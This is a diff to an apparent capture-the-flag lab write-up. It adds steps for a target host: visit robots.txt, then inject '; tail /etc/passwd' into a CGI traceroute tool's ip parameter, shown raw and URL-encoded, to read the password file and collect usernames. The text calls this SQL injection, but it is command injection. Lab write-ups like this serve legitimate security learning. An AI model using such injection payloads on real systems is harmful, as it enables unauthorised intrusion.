@@ -108,6 +108,30 @@ https://< IP >:9090/
 ## `POINTS : 40`
 <br>
 
+* Back to port 80 web
+```bash
+http://< IP >/robots.txt
+```
+![rick robots](https://user-images.githubusercontent.com/112984045/202860080-3ee53497-1941-42f5-becd-c10e76c98327.png)<br>
+
+```bash
+http://< IP >/cgi-bin/tracertool.cgi
+```
+![rick tracrroute](https://user-images.githubusercontent.com/112984045/202860217-1a4eb34c-297b-4ce8-9225-a510dcafb84c.png)<br>
+
+` this web-page is vuln to sqli so try command :`
+```bash
+; tail /etc/passwd
+```
+or
+```bash
+http://< IP >/cgi-bin/tracertool.cgi?ip=%3B+tail+%2Fetc%2Fpasswd
+```
+<br>
+
+* Now we have 3 usernames
+
+
 
 
 
